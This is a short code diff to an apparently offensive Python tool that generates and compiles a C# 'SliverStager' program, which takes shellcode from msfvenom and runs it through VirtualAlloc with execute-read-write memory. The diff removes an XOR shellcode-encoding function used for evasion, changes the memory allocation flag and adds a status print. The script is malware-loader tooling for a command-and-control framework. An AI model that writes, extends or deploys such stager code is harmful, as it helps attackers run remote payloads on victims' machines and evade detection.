@@ -13,10 +13,6 @@ def get_shellcode(msfvenom_cmd):
 
   return shellcode
 
-def enc_shellcode(shellcode):
-  key = bytearray(b'\x09') * len(shellcode)
-  return [ a ^ b for (a,b) in zip(shellcode, key) ] 
-
 def generate(stager_url):
 
   template = """
@@ -47,7 +43,7 @@ namespace SliverStager
             return;
         }}
 
-        private static UInt32 MEM_COMMIT = 0x1000;
+        private static UInt32 MEM_COMMIT = 0x3000;
         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         [DllImport("kernel32")]
         private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
@@ -74,6 +70,8 @@ namespace SliverStager
   f = open(BASE_FILENAME + ".cs", "w")
   f.write(template)
   f.close()
+
+  print("Wrote " + BASE_FILENAME + ".cs")
 
 
 def compile():
